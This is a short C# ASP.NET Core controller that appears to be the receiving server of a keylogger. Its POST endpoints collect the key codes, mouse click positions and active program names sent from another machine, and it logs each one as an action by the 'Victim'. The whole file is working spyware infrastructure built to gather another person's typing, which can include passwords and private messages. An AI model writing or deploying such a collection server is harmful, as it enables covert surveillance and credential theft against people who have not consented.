using Microsoft.AspNetCore.Mvc;

namespace KeyboardHookReceiver;

[ApiController]
[Route("/api/hooks")]
public class ReceiverController : Controller
{
    [HttpPost]
    [Route("/keyboard")]
    public void ReceiveKeyboardActions(KeyboardInputDto json)
    {
        Console.WriteLine($"{json.Time} | Victim pressed key[{json.KeyCode}] in {json.Program}");
    }

    [HttpPost]
    [Route("/mouse")]
    public void ReceiveMouseActions(MouseClickPosInputDto json)
    {
        Console.WriteLine($"{json.Time} | Victim {json.clickSide}Clicked at pos({json.X}, {json.Y}) in {json.Program}");
    }
}

public class MouseClickPosInputDto
{
    public string? Time { get; set; }
    public int X { get; set; }
    public int Y { get; set; }
    public string? Program { get; set; }
    public string? clickSide { get; set; }
}

public class KeyboardInputDto
{
    public string? Time { get; set; }
    public string? Program { get; set; }
    public int KeyCode { get; set; }
}